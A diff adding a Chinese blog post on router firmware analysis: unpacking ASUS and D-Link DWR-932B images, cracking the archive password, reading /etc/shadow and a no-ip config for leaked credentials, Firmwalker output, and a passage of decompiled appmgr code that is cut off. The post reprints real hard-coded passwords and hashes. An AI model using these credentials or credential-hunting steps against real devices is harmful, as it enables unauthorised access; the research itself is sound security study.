@@ -1,0 +1,1755 @@
+---
+layout: post
+title:  固件分析与漏洞利用
+date:   2022-01-05 00:08:01 +0300
+image:  2022-01-05-field.jpg
+tags:   [iot]
+---
+
+#### 固件提取
+
+从厂商网站下载固件
+
+https://www.asus.com/us/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RT-AC5300/HelpDesk_Download/
+
+解压得到目标文件RT-AC5300_3.0.0.4_386_43576-g649d261.trx
+
+#### 固件分析
+
+如果想要查找Squashfs文件系统，可以使用grep命令在hexdump的执行结果中查找“hsqs”字符串
+
+```assembly
+└─$ hexdump -C RT-AC5300_3.0.0.4_386_43576-g649d261.trx | grep -i "hsqs"
+001be6d0  5e bf bb f3 15 03 6f ca  00 00 00 00 68 73 71 73  |^.....o.....hsqs|
+```
+
+或者使用binwalk查看
+
+```assembly
+└─$ binwalk ./RT-AC5300_3.0.0.4_386_43576-g649d261.trx 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             TRX firmware header, little endian, image size: 42639360 bytes, CRC32: 0xCE547B67, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x1BE6DC, rootfs offset: 0x0
+28            0x1C            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 4453056 bytes
+1828572       0x1BE6DC        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 40807270 bytes, 3050 inodes, blocksize: 131072 bytes, created: 2021-06-05 00:41:20
+```
+
+可以看到在0x1BE6DC发现了Squashfs文件系统。获得了这些信息后，就可以使用dd命令将从该地址到文件末尾的内容全部转储下来。
+
+```assembly
+└─$ dd if=RT-AC5300_3.0.0.4_386_43576-g649d261.trx bs=1 skip=1828572 of=rt-n300-fs
+40810788+0 records in
+40810788+0 records out
+40810788 bytes (41 MB, 39 MiB) copied, 137.005 s, 298 kB/s
+```
+
+运行unsquashfs命令提取出整个文件系统
+
+```assembly
+└─$ unsquashfs rt-n300-fs 
+Parallel unsquashfs: Using 4 processors
+2897 inodes (3429 blocks) to write
+
+[==========================================================-] 3429/3429 100%
+
+created 2535 files
+created 153 directories
+created 362 symlinks
+created 0 devices
+created 0 fifos
+created 0 sockets
+```
+
+对于我们提取出的文件系统
+
+```assembly
+└─$ ls
+bin    cifs2  etc   jffs  media  mnt  proc  root  sys      tmp  var
+cifs1  dev    home  lib   mmc    opt  rom   sbin  sysroot  usr  www
+```
+
+#### 文件系统分析
+
+使用路由器D-Link DWR 932B的固件，版本号为DWR-932_fw_revB_2_02_eu_en_20150709
+
+https://media.dlink.eu/ftp/products/dwr/dwr-932/driver_software/DWR-932_fw_revB_2_02_eu_en_20150709.zip
+
+从固件中提取文件系统，但是固件为加密的ZIP文件，使用fcrackzip进行口令破解(其实这个工具破解很慢)
+
+```assembly
+>fcrackzip.exe -u -v -b DWR-932_B1_FW_v.02.02EU.zip
+'DWR-932_B1_FW_v.02.02EU/' is not encrypted, skipping
+'DWR-932_B1_FW_v.02.02EU/02.02EU' is not encrypted, skipping
+found file 'DWR-932_B1_FW_v.02.02EU/2K-cksum.txt', (size cp/uc    462/   787, flags 9, chk 9423)
+found file 'DWR-932_B1_FW_v.02.02EU/2K-mdm-image-boot-mdm9625.img', (size cp/uc 3491431/3823616, flags 9, chk 394a)
+found file 'DWR-932_B1_FW_v.02.02EU/2K-mdm-image-mdm9625.yaffs2', (size cp/uc 9285023/25869888, flags 9, chk 394a)
+found file 'DWR-932_B1_FW_v.02.02EU/2K-mdm-recovery-image-boot-mdm9625.img', (size cp/uc 3491431/3823616, flags 9, chk 394a)
+found file 'DWR-932_B1_FW_v.02.02EU/2K-mdm-recovery-image-mdm9625.yaffs2', (size cp/uc 6088804/14733312, flags 9, chk 394a)
+found file 'DWR-932_B1_FW_v.02.02EU/2K-mdm9625-usr-image.usrfs.yaffs2', (size cp/uc 10218654/27439104, flags 9, chk 9422)
+found file 'DWR-932_B1_FW_v.02.02EU/appsboot.mbn', (size cp/uc  38181/ 69872, flags 9, chk 394a)
+found file 'DWR-932_B1_FW_v.02.02EU/mba.mbn', (size cp/uc 136535/365464, flags 9, chk 394a)
+8 file maximum reached, skipping further files
+
+PASSWORD FOUND!!!!: pw == beUT9Z
+```
+
+破解出的口令是beUT9Z
+
+解压zip文件后发现文件夹中有多个.yaffs2后缀的文件
+
+```assembly
+>tree /f
+卷 Data 的文件夹 PATH 列表
+卷序列号为 9259-51F2
+D:.
+    02.02EU
+    2K-cksum.txt
+    2K-mdm-image-boot-mdm9625.img
+    2K-mdm-image-mdm9625.yaffs2
+    2K-mdm-recovery-image-boot-mdm9625.img
+    2K-mdm-recovery-image-mdm9625.yaffs2
+    2K-mdm9625-usr-image.usrfs.yaffs2
+    appsboot.mbn
+    mba.mbn
+    qdsp6sw.mbn
+    rpm.mbn
+    sbl1.mbn
+    tz.mbn
+    wdt.mbn
+```
+
+核心的应该是2K-mdm-image-mdm9625.yaffs2，使用unyaffs提取整个文件系统 
+
+```assembly
+└─$ sudo unyaffs 2K-mdm-image-mdm9625.yaffs2 yaffs2-root/
+```
+
+从安全视角查找其中可能存在漏洞的文件，运行find命令查找所有后缀为".conf"的文件
+
+```assembly
+└─$ find . -name '*.conf' 
+./etc/nsswitch.conf
+./etc/igd/miniupnpd.conf
+./etc/AR6004_AP1_hostapd.conf
+./etc/dbus-1/system.d/avahi-dbus.conf
+./etc/dbus-1/session.conf
+./etc/dbus-1/system.conf
+./etc/mdev.conf
+./etc/avahi/avahi-daemon.conf
+./etc/AR6003_AP1_hostapd.conf
+./etc/host.conf
+./etc/hostapd.conf
+./etc/inadyn-mt.conf
+./etc/pimd.conf
+./etc/AR6004_hostapd.conf
+./etc/AR6003_hostapd.conf
+./etc/radvd.conf
+./etc/wpa_supplicant.conf
+```
+
+其中的inadyn-mt.conf文件引起了我们注意，这是no-ip应用的配置文件，no-ip就是一个相当于花生壳的东西，可以申请动态域名。我们从中可以发现泄露的路由器的no-IP配置信息，包括用于访问网站https://www/no-ip/com的用户名和口令。
+
+```assembly
+└─$ cat ./etc/inadyn-mt.conf 
+--log_file /usr/inadyn_srv.log
+--forced_update_period 6000
+--username alex_hung
+--password 641021
+--dyndns_system default@no-ip.com
+--alias test.no-ip.com         
+```
+
+还从shadow文件中找到了root账号的密码，通过爆破可以得到root的密码为1234。
+
+```assembly
+└─$ sudo cat ./etc/shadow                                                  1 ⨯
+root:aRDiHrJ0OkehM:16270:0:99999:7:::
+daemon:*:16270:0:99999:7:::
+bin:*:16270:0:99999:7:::
+sys:*:16270:0:99999:7:::
+sync:*:16270:0:99999:7:::
+games:*:16270:0:99999:7:::
+man:*:16270:0:99999:7:::
+lp:*:16270:0:99999:7:::
+mail:*:16270:0:99999:7:::
+news:*:16270:0:99999:7:::
+uucp:*:16270:0:99999:7:::
+proxy:*:16270:0:99999:7:::
+www-data:*:16270:0:99999:7:::
+backup:*:16270:0:99999:7:::
+list:*:16270:0:99999:7:::
+irc:*:16270:0:99999:7:::
+gnats:*:16270:0:99999:7:::
+diag:*:16270:0:99999:7:::
+nobody:*:16270:0:99999:7:::
+messagebus:!:16270:0:99999:7:::
+avahi:!:16270:0:99999:7:::
+```
+
+使用脚本自动化识别固件中可能包含的常见敏感信息，Firmwalker脚本能够识别出多种敏感信息，包括二进制文件、证书、IP地址、私钥等，同时将输出结果都保存在firmwalker.txt文件中。
+
+```assembly
+***Firmware Directory***
+/home/kali/Documents/ctf/yaffs2-root
+***Search for password files***
+##################################### passwd
+t/bin/passwd
+t/var/lib/opkg/alternatives/passwd
+t/etc/passwd
+
+##################################### shadow
+t/etc/shadow
+
+##################################### *.psk
+
+***Search for Unix-MD5 hashes***
+
+
+***Search for SSL related files***
+##################################### *.crt
+
+##################################### *.pem
+
+##################################### *.cer
+
+##################################### *.p7b
+
+##################################### *.p12
+
+##################################### *.key
+
+
+***Search for SSH related files***
+##################################### authorized_keys
+
+##################################### *authorized_keys*
+
+##################################### host_key
+
+##################################### *host_key*
+
+##################################### id_rsa
+
+##################################### *id_rsa*
+
+##################################### id_dsa
+
+##################################### *id_dsa*
+
+##################################### *.pub
+
+
+***Search for files***
+##################################### *.conf
+t/etc/nsswitch.conf
+t/etc/igd/miniupnpd.conf
+t/etc/AR6004_AP1_hostapd.conf
+t/etc/dbus-1/system.d/avahi-dbus.conf
+t/etc/dbus-1/session.conf
+t/etc/dbus-1/system.conf
+t/etc/mdev.conf
+t/etc/avahi/avahi-daemon.conf
+t/etc/AR6003_AP1_hostapd.conf
+t/etc/host.conf
+t/etc/hostapd.conf
+t/etc/inadyn-mt.conf
+t/etc/pimd.conf
+t/etc/AR6004_hostapd.conf
+t/etc/AR6003_hostapd.conf
+t/etc/radvd.conf
+t/etc/wpa_supplicant.conf
+
+##################################### *.cfg
+
+##################################### *.ini
+
+
+***Search for database related files***
+##################################### *.db
+
+##################################### *.sqlite
+
+##################################### *.sqlite3
+
+
+***Search for shell scripts***
+##################################### shell scripts
+t/etc/mdev/automountsdcard.sh
+t/etc/mdev/automounthdd.sh
+t/etc/mdev/usb.sh
+t/etc/mdev/find-touchscreen.sh
+t/etc/rc2.d/S99rmnologin.sh
+t/etc/rc4.d/S99rmnologin.sh
+t/etc/bash_completion.d/gsettings-bash-completion.sh
+t/etc/bash_completion.d/gdbus-bash-completion.sh
+t/etc/init.d/devpts.sh
+t/etc/init.d/sysfs.sh
+t/etc/init.d/populate-volatile.sh
+t/etc/init.d/modutils.sh
+t/etc/init.d/banner.sh
+t/etc/init.d/bootmisc.sh
+t/etc/init.d/keymap.sh
+t/etc/init.d/mountnfs.sh
+t/etc/init.d/set-hwver.sh
+t/etc/init.d/alignment.sh
+t/etc/init.d/hwclock.sh
+t/etc/init.d/umountnfs.sh
+t/etc/init.d/mountall.sh
+t/etc/init.d/hostname.sh
+t/etc/init.d/rmnologin.sh
+t/etc/init.d/checkroot.sh
+t/etc/init.d/save-rtc.sh
+t/etc/qdt_rc0clean.sh
+t/etc/rcS.d/S01keymap.sh
+t/etc/rcS.d/S10checkroot.sh
+t/etc/rcS.d/S35mountall.sh
+t/etc/rcS.d/S02sysfs.sh
+t/etc/rcS.d/S06alignment.sh
+t/etc/rcS.d/S02banner.sh
+t/etc/rcS.d/S39hostname.sh
+t/etc/rcS.d/S55bootmisc.sh
+t/etc/rcS.d/S37populate-volatile.sh
+t/etc/rcS.d/S45mountnfs.sh
+t/etc/rcS.d/S38devpts.sh
+t/etc/rcS.d/S04modutils.sh
+t/etc/rc5.d/S99rmnologin.sh
+t/etc/rc0.d/S31umountnfs.sh
+t/etc/rc0.d/S25save-rtc.sh
+t/etc/rc3.d/S99rmnologin.sh
+t/etc/rc6.d/S31umountnfs.sh
+t/etc/rc6.d/S25save-rtc.sh
+
+***Search for other .bin files***
+##################################### bin files
+t/lib/firmware/ath6k/AR6004/hw3.0/otp.bin
+t/lib/firmware/ath6k/AR6004/hw3.0/utf.bin
+t/lib/firmware/ath6k/AR6004/hw3.0/bdata.bin
+t/lib/firmware/ath6k/AR6004/hw3.0/fw-3.bin
+t/lib/firmware/ath6k/AR6003/hw2.1.1/otp.bin
+t/lib/firmware/ath6k/AR6003/hw2.1.1/bdata.SD31.bin
+t/lib/firmware/ath6k/AR6003/hw2.1.1/athwlan_router.bin
+t/lib/firmware/ath6k/AR6003/hw2.1.1/data.patch.hw3_0.bin
+t/lib/firmware/ath6k/AR6003/hw2.1.1/athtcmd_ram.bin
+
+***Search for patterns in files***
+-------------------- upgrade --------------------
+t/bin/lcdd
+t/bin/lcdtest
+t/bin/agent
+t/bin/tinyproxy
+t/bin/qmiweb
+t/sbin/fotad
+t/var/lib/opkg/info/busybox-syslog.prerm
+
+-------------------- admin --------------------
+t/lib/libamapi.so
+t/bin/agent
+t/bin/appmgr
+t/bin/amapi
+t/bin/qmiweb
+t/bin/tr069
+t/WEBSERVER/www/cgi-bin/qcmap_auth
+t/WEBSERVER/www/QCMAP_login.html
+t/var/lib/opkg/info/base-passwd.preinst
+t/etc/services
+t/etc/passwd
+
+-------------------- root --------------------
+t/lib/libblkid.so.1
+t/lib/libqutils.so
+t/lib/libjansson.so
+t/lib/libmount.so.1
+t/bin/ramond
+t/bin/busybox
+t/bin/mount.util-linux
+t/bin/agent
+t/bin/radvd
+t/bin/tinyproxy
+t/bin/qmiweb
+t/bin/tinylogin
+t/bin/umount.util-linux
+t/bin/login.shadow
+t/sbin/fdisk.util-linux
+t/sbin/ip.iproute2
+t/sbin/ctrlaltdel
+t/sbin/swapon.util-linux
+t/sbin/readprofile.util-linux
+t/sbin/tc
+t/sbin/adbd
+t/sbin/shutdown.sysvinit
+t/sbin/ddns_qmi
+t/sbin/miniupnpd
+t/sbin/cfdisk
+t/sbin/killall5
+t/sbin/dnsmasq_qmi
+t/sbin/dlna6_dms
+t/var/lib/opkg/info/base-passwd.preinst
+t/var/lib/opkg/info/avahi-daemon.preinst
+t/var/lib/opkg/info/shadow.postinst
+t/var/lib/opkg/info/dbus-1.preinst
+t/var/lib/opkg/info/base-files.list
+t/var/lib/opkg/info/base-passwd.control
+t/etc/dbus-1/system.d/avahi-dbus.conf
+t/etc/init.d/usb
+t/etc/init.d/bootmisc.sh
+t/etc/init.d/avahi-daemon
+t/etc/init.d/hwclock.sh
+t/etc/init.d/power_config
+t/etc/init.d/checkroot.sh
+t/etc/default/rcS
+t/etc/default/volatiles/00_core
+t/etc/limits
+t/etc/group
+t/etc/passwd
+t/etc/login.defs
+t/etc/udhcpc.d/udhcpc.script
+
+-------------------- password --------------------
+t/lib/libqutils.so
+t/lib/libc.so.6
+t/bin/busybox
+t/bin/mount.util-linux
+t/bin/agent
+t/bin/appmgr
+t/bin/qmodmd
+t/bin/amapi
+t/bin/qmiweb
+t/bin/tinylogin
+t/bin/umount.util-linux
+t/bin/login.shadow
+t/bin/tr069
+t/sbin/ddns_qmi
+t/sbin/losetup.util-linux
+t/WEBSERVER/www/QCMAP_Account.html
+t/WEBSERVER/www/QCMAP_Account_Help.html
+t/WEBSERVER/www/QCMAP_login.html
+t/var/lib/opkg/info/avahi-autoipd.postinst
+t/var/lib/opkg/info/shadow.control
+t/var/lib/opkg/info/base-passwd.control
+t/etc/inadyn-mt.conf
+t/etc/login.defs
+t/etc/tr069/param.xml
+t/etc/tr069/igd_10.xml
+t/disk/internal-storage.iso
+
+-------------------- passwd --------------------
+t/lib/libqutils.so
+t/lib/libnss_files.so.2
+t/lib/libc.so.6
+t/lib/libnss_compat.so.2
+t/lib/libamapi.so
+t/bin/busybox
+t/bin/agent
+t/bin/appmgr
+t/bin/qmodmd
+t/bin/amapi
+t/bin/qmiweb
+t/bin/tinylogin
+t/bin/amgrevt
+t/bin/login.shadow
+t/sbin/vipw.shadow
+t/var/lib/opkg/status
+t/var/lib/opkg/info/base-passwd.preinst
+t/var/lib/opkg/info/avahi-daemon.control
+t/var/lib/opkg/info/busybox.control
+t/var/lib/opkg/info/busybox-syslog.control
+t/var/lib/opkg/info/shadow.prerm
+t/var/lib/opkg/info/avahi-daemon.preinst
+t/var/lib/opkg/info/shadow.postinst
+t/var/lib/opkg/info/dbus-1.control
+t/var/lib/opkg/info/task-core-boot.control
+t/var/lib/opkg/info/dbus-1.preinst
+t/var/lib/opkg/info/shadow.list
+t/var/lib/opkg/info/avahi-autoipd.postinst
+t/var/lib/opkg/info/busybox-mountall.control
+t/var/lib/opkg/info/tinylogin.list
+t/var/lib/opkg/info/base-passwd.control
+t/var/lib/opkg/info/busybox-mdev.control
+t/var/lib/opkg/info/router.list
+t/var/lib/opkg/alternatives/passwd
+t/etc/nsswitch.conf
+t/etc/services
+t/etc/busybox.links
+t/etc/init.d/populate-volatile.sh
+t/etc/login.defs
+
+-------------------- pwd --------------------
+t/lib/libc.so.6
+t/bin/ramond
+t/bin/busybox
+t/bin/appmgr
+t/bin/qmodmd
+t/bin/amapi
+t/bin/qmiweb
+t/bin/tinylogin
+t/bin/login.shadow
+t/WEBSERVER/www/QCMAP_login.html
+t/var/lib/opkg/alternatives/pwd
+t/etc/busybox.links
+
+-------------------- dropbear --------------------
+t/var/lib/opkg/status
+t/var/lib/opkg/info/dropbear.control
+t/var/lib/opkg/info/dropbear.list
+t/var/lib/opkg/info/dropbear.postinst
+t/var/lib/opkg/info/dropbear.postrm
+t/var/lib/opkg/info/dropbear.prerm
+t/etc/init.d/dropbear
+
+-------------------- ssl --------------------
+t/bin/agent
+t/bin/tinyproxy
+t/var/lib/opkg/info/openssl.list
+t/var/lib/opkg/info/openssl.control
+t/var/lib/opkg/info/libcrypto1.0.0.control
+t/var/lib/opkg/info/libssl1.0.0.control
+t/etc/services
+
+-------------------- private key --------------------
+t/bin/agent
+
+-------------------- telnet --------------------
+t/bin/busybox
+t/var/lib/opkg/alternatives/telnet
+t/etc/services
+t/etc/busybox.links
+t/etc/default/rcS
+
+-------------------- secret --------------------
+t/bin/dhcp6c
+t/bin/dhcp6s
+
+-------------------- pgp --------------------
+t/lib/libresolv.so.2
+
+-------------------- gpg --------------------
+t/disk/internal-storage.iso
+
+-------------------- token --------------------
+t/lib/libblkid.so.1
+t/lib/libpcap.so.1
+t/lib/libqutils.so
+t/lib/libjansson.so
+t/lib/libsqlite3.so.0
+t/lib/libc.so.6
+t/lib/libmount.so.1
+t/lib/ld-linux.so.3
+t/bin/ramond
+t/bin/busybox
+t/bin/radvd
+t/bin/qmiweb
+t/sbin/iwconfig
+t/sbin/tc
+t/sbin/adbd
+t/WEBSERVER/www/QCMAP_Firewall.html
+t/WEBSERVER/www/QCMAP_WLAN.html
+
+-------------------- api key --------------------
+
+-------------------- oauth --------------------
+
+
+***Search for web servers***
+##################################### search for web servers
+##################################### apache
+
+##################################### lighttpd
+
+##################################### alphapd
+
+##################################### httpd
+t/sbin/httpd
+t/var/lib/opkg/alternatives/httpd
+
+
+***Search for important binaries***
+##################################### important binaries
+##################################### ssh
+t/var/lib/opkg/alternatives/ssh
+
+##################################### sshd
+
+##################################### scp
+t/var/lib/opkg/alternatives/scp
+
+##################################### sftp
+
+##################################### tftp
+t/bin/tftp
+t/var/lib/opkg/alternatives/tftp
+
+##################################### dropbear
+t/etc/init.d/dropbear
+t/etc/dropbear
+
+##################################### busybox
+t/bin/busybox
+
+##################################### telnet
+t/bin/telnet
+t/var/lib/opkg/alternatives/telnet
+
+##################################### telnetd
+t/sbin/telnetd
+t/var/lib/opkg/alternatives/telnetd
+
+##################################### openssl
+
+
+***Search for ip addresses***
+##################################### ip addresses
+0.0.0.0
+127.0.0.1
+1.4.12.1
+169.254.0.0
+169.254.255.255
+192.168.0.0
+192.168.0.1
+192.168.0.20
+192.168.0.40
+192.168.1.0
+192.168.10.1
+192.168.10.109
+192.168.1.1
+192.168.1.20
+192.168.1.40
+192.168.1.8
+192.168.2.1
+192.168.2.20
+192.168.2.40
+192.168.50.1
+192.168.50.2
+192.168.7.0
+192.168.7.1
+192.168.7.113
+192.168.7.2
+224.0.0.0
+255.255.0.0
+255.255.255.0
+255.255.255.255
+4.1.4.2
+4.1.4.3
+88.22.44.13
+
+***Search for urls***
+##################################### urls
+http://0pointer.de
+http://avahi.org
+http://codeaurora.org
+http://code.google.com
+http://dbus.freedesktop.org
+http://developer.android.com
+http://download.savannah.gnu.org
+http://downloads.sourceforge.net
+http://ebtables.sourceforge.net
+http://expat.sourceforge.net
+http://ftp.gnome.org
+http://kernel.org
+http://linuxwireless.org
+http://matt.ucc.asn.au
+http://miniupnp.free.fr
+http://netfilter.org
+http://packages.debian.org
+http://pkg-shadow.alioth.debian.org
+http://savannah.nongnu.org
+http://sites.google.com
+http://sourceforge.net
+http://support.cdmatech.com
+http://theory.uwinnipeg.ca
+http://tinylogin.busybox.net
+http://wireless.kernel.org
+http://www.angstrom-distribution.org
+http://www.busybox.net
+http://www.eglibc.org
+http://www.freebsd.org
+http://www.freedesktop.org
+http://www.gnu.org
+http://www.hpl.hp.com
+http://www.iana.org
+http://www.info-zip.org
+http://www.infradead.org
+http://www.linuxfoundation.org
+http://www.linux-mtd.infradead.org
+http://www.mylan
+http://www.netfilter.org
+http://www.openssl.org
+http://www.quantatw.com
+http://www.tcpdump.org
+http://www.w3.org
+http://www.xmlsoft.org
+http://www.zlib.net
+http://zlib.net
+
+***Search for emails***
+##################################### emails
+ajt@debian.org
+bdschuym@pandora.be
+Bruce@Pixar.com
+bruno.randolf@4g-systems.biz
+dag@wieers.com
+default@no-ip.com
+miquels@cistron.nl
+openembedded-core@lists.openembedded.org
+rok.papez@arnes.si
+rpurdie@openedhand.com
+sandman@handhelds.org
+sebastien.estienne@gmail.com
+srb@cuci.nl
+Tim@Rikers.org
+walters@debian.org
+```
+
+拿到Firmware生成的报告后就可以分别查看报告中所列出的各个文件并对齐开展进一步分析。
+
+查看自启动的程序，一个start_appmgr脚本引起了我们注意，mgr一般就是主控程序的意思。
+
+```assembly
+#! /bin/sh
+#
+
+# appmgr init.d script to start router daemon
+export KERNEL=`uname -r`
+export MODULE_BASE=/lib/modules/$KERNEL/updates
+export RETRY_LIMIT=3
+export SDCC_SLOT=3
+export SDCC_SLOT2=2
+
+#Vince {
+BOOT_MODE=`cat /proc/cmdline | sed -n 's/.*boot_mode=\(........\) .*/\1/p'`
+
+if [ "x${BOOT_MODE}" == "xcharging" ]; then
+        start-stop-daemon -S -b -a /bin/pfcharging
+        exit 0
+fi
+#Vince }
+
+#Sandro { for telnetd debug...
+start-stop-daemon -S -b -a /bin/logmaster
+#if [ -e /config2/telnetd ]; then
+        start-stop-daemon -S -b -a /sbin/telnetd
+#fi
+#Sandro }
+
+#Sandro set hw id start
+if [ -e /etc/init.d/set-hwver.sh ]; then
+        /etc/init.d/set-hwver.sh
+fi
+#Sandro set hw id end
+
+if [ ! -e /etc/versions ]; then
+        if [ -e /usr/etc/versions ]; then
+                ln -nsf /usr/etc/versions /etc/versions
+        fi
+fi
+
+if [ ! -e /etc/qrcfg ]; then
+        if [ -d /usr/etc/qrcfg ]; then
+                ln -nsf /usr/etc/qrcfg /etc/qrcfg
+        fi
+fi
+
+if [ ! -e /www ]; then
+        if [ -d /usr/www ]; then
+                ln -sf /usr/www /www
+        fi
+fi
+
+if [  -f /sbin/netcfg ]; then
+        echo -n "chmod 777 netcfg"
+        chmod 777 /sbin/netcfg
+fi
+
+if [  -f /bin/QNetCfg ]; then
+        echo -n "chmod 777 QNetCfg"
+        chmod 777 /bin/QNetCfg
+fi
+
+#if [ ! -e /data ]; then
+#        mkdir -p /data
+#        mount -t yaffs2 /dev/mtdblock12 /data
+#fi
+
+# Get the vendor_id, [Generic|Pure]
+VENDOR_ID=$(grep vendor_id /etc/versions 2>/dev/null | awk -F"=" '{print $2}')
+
+case "$1" in
+    start)
+        if [ "$VENDOR_ID" = "Pure" ]; then
+            echo -n "Starting btnd: "
+            start-stop-daemon -S -b -a /bin/btnd
+            echo "done"
+        else
+            echo -n "Starting appmgr: "
+            start-stop-daemon -S -b -a /bin/appmgr
+            echo "done"
+        fi
+        ;;
+    stop)
+        if [ "$VENDOR_ID" = "Pure" ]; then
+            echo -n "Stopping btnd: "
+            start-stop-daemon -K -n btnd
+            echo "done"
+        else
+            echo -n "Stopping appmgr: "
+            start-stop-daemon -K -n appmgr
+            echo "done"
+        fi
+        ;;
+    restart)
+        $0 stop
+        $0 start
+        ;;
+    *)
+        echo "Usage appmgr { start | stop | restart}" >&2
+        exit 1
+        ;;
+esac
+
+
+exit 0
+
+```
+
+该脚本会在开机的时候以服务的形式运行/bin/appmgr程序。
+
+ida反编译查看main函数
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __pid_t v3; // r6
+  FILE *v4; // r0
+  FILE *v5; // r5
+  FILE *v6; // r5
+  int v7; // r6
+  int i; // r0
+  unsigned int v9; // r12
+  int v11; // r0
+  int v12; // r0
+  int v13; // r0
+  int *v14; // r8
+  int v15; // r4
+  int v16; // t1
+  int v17; // r0
+  int *v18; // r8
+  int v19; // r4
+  int v20; // t1
+  int v21; // r3
+  int v22; // r3
+  bool v23; // nf
+  socklen_t *v24; // r2
+  socklen_t v25; // r1
+  int v26; // r3
+  int v27; // r0
+  time_t *v28; // r8
+  signed int v29; // r0
+  unsigned __int16 *v30; // r7
+  ssize_t v31; // r9
+  int v32; // r11
+  time_t v33; // r0
+  int v34; // r4
+  char *v35; // r0
+  size_t v36; // r0
+  int v37; // r7
+  char *v38; // r0
+  unsigned int v39; // r12
+  int v40; // r0
+  int v41; // r0
+  int v42; // r0
+  int v43; // r8
+  int v44; // r9
+  time_t v45; // r0
+  int v46; // lr
+  int *v47; // r3
+  _DWORD *v48; // r8
+  _DWORD *v49; // t1
+  int v50; // r8
+  int v51; // r9
+  time_t v52; // r0
+  time_t *timer; // [sp+18h] [bp-240h]
+  int v54; // [sp+1Ch] [bp-23Ch]
+  int v55; // [sp+20h] [bp-238h]
+  char *v56; // [sp+28h] [bp-230h]
+  char *s1; // [sp+30h] [bp-228h]
+  unsigned int v58; // [sp+34h] [bp-224h]
+  unsigned int v59; // [sp+38h] [bp-220h]
+  int v60; // [sp+3Ch] [bp-21Ch]
+  struct sigaction v61; // [sp+54h] [bp-204h] BYREF
+  fd_set v62; // [sp+E0h] [bp-178h] BYREF
+  struct sockaddr v63[8]; // [sp+160h] [bp-F8h] BYREF
+  struct sockaddr v64; // [sp+1E0h] [bp-78h] BYREF
+  struct timeval timeout; // [sp+220h] [bp-38h] BYREF
+  int sig; // [sp+228h] [bp-30h] BYREF
+  socklen_t addr_len[11]; // [sp+22Ch] [bp-2Ch] BYREF
+
+  sig = 0;
+  if ( !access("/etc/rc0.d/K80qmuxd", 0) && !access("/etc/qdt_rc0clean.sh", 0) )
+  {
+    am_comprintf(1, 0, 0, "APPMGR: RC_CLEAN!!!\n");
+    system("chmod +x /etc/qdt_rc0clean.sh");
+    system("/etc/qdt_rc0clean.sh");
+  }
+  if ( access("/var/usock", 0) )
+    appmgr_system2("busybox", "mkdir -p %s", "/var/usock");
+  if ( access("/config", 0) )
+    appmgr_system2("busybox", "mkdir -p %s", "/config");
+  if ( access("/var/run", 0) )
+    appmgr_system2("busybox", "mkdir -p /var/run");
+  if ( access("/var/fmon", 0) )
+    appmgr_system2("busybox", "mkdir -p /var/fmon");
+  if ( access("/var/fifo", 0) )
+    appmgr_system2("busybox", "mkdir -p /var/fifo");
+  v3 = getpid();
+  dword_7E17C = v3;
+  v4 = fopen("/var/appmgr.pid", "wt");
+  v5 = v4;
+  if ( v4 )
+  {
+    fprintf(v4, "%d", v3);
+    fflush(v5);
+    fclose(v5);
+  }
+  pthread_mutex_init(&stru_83904, 0);
+  if ( (int)time(0) <= 0x4D1E6E7F )
+  {
+    am_comprintf(1, 0, 0, "APPMGR: TimeSkew...DoTimeReset!!!!\n");
+    system("date -s 2012.01.01-00:00:00");
+  }
+  v6 = fopen("/proc/sys/net/unix/max_dgram_qlen", "wt");
+  if ( v6 )
+  {
+    fwrite("20", 1u, 2u, v6);
+    fclose(v6);
+  }
+  v7 = socket(1, 2, 0);
+  if ( v7 <= 0 )
+  {
+    v9 = 0xFFFFFFFF;
+  }
+  else
+  {
+    v63[0].sa_family = 1;
+    sprintf(v63[0].sa_data, "%s/%s", "/var/usock", "appmgr.us");
+    if ( bind(v7, v63, 0x6Eu) >= 0 )
+      goto LABEL_20;
+    if ( connect(v7, v63, 0x6Eu) )
+    {
+      if ( unlink(v63[0].sa_data) < 0 )
+      {
+        am_comprintf(1, "appmgr_uscok_create", 0x65C, "Error removing old socket\n");
+        v9 = 0xFFFFFFFD;
+      }
+      else
+      {
+        if ( bind(v7, v63, 0x6Eu) >= 0 )
+        {
+LABEL_20:
+          gAM_usock_fd = v7;
+          fcntl(v7, 2, 1);
+          for ( i = sig; i <= 0x41; i = ++sig )
+            signal(i, (__sighandler_t)1);
+          fclose((FILE *)stdin);
+          snprintf((char *)v63, 0x7Fu, "/proc/%d/oom_score_adj", dword_7E17C);
+          appmgr_echocmd(v63, "-16");
+          signal(0xF, (__sighandler_t)sub_11378);
+          signal(0x11, (__sighandler_t)sub_113E4);
+          signal(0xD, (__sighandler_t)sub_11364);
+          signal(6, (__sighandler_t)sub_11364);
+          signal(7, (__sighandler_t)sub_11364);
+          signal(0xA, (__sighandler_t)sub_113B8);
+          memset(&gFmonHdl, 0, 0x58u);
+          v55 = qfmon_hdl_init(&gFmonHdl, "appmgr");
+          if ( v55 < 0 )
+            am_comprintf(1, 0, 0, "APPMGR: qfmon hdl init fail.\n");
+          sigemptyset(&v61.sa_mask);
+          v61.sa_handler = (__sighandler_t)sub_120FC;
+          v61.sa_flags = 4;
+          sigaction(0xB, &v61, 0);
+          sigaction(6, &v61, 0);
+          dword_7E174 = socket(2, 2, 0);
+          am_comprintf(1, 0, 0, "UDPLOG: init(%d)...\n", dword_7E174);
+          if ( dword_7E174 < 0 )
+          {
+            am_comprintf(1, "appmgr_udplog_init", 0x7EA, "UDPLOG: sockopen fail\n");
+          }
+          else
+          {
+            v11 = fcntl(dword_7E174, 3, 0);
+            if ( fcntl(dword_7E174, 4, v11 | 0x800) < 0 )
+            {
+              am_comprintf(1, "appmgr_udplog_init", 0x7D3, "UDPLOG: nonblocking fail\n");
+              close(dword_7E174);
+              dword_7E174 = 0xFFFFFFFF;
+            }
+            else
+            {
+              fcntl(dword_7E174, 2, 1);
+              memset(&v64, 0, sizeof(v64));
+              v64.sa_family = 2;
+              *(_WORD *)v64.sa_data = 0xD19B;
+              if ( bind(dword_7E174, &v64, 0x10u) < 0 )
+              {
+                am_comprintf(1, "appmgr_udplog_init", 0x7E1, "UDPLOG: bind fail\n");
+                close(dword_7E174);
+                dword_7E174 = 0xFFFFFFFF;
+              }
+              else
+              {
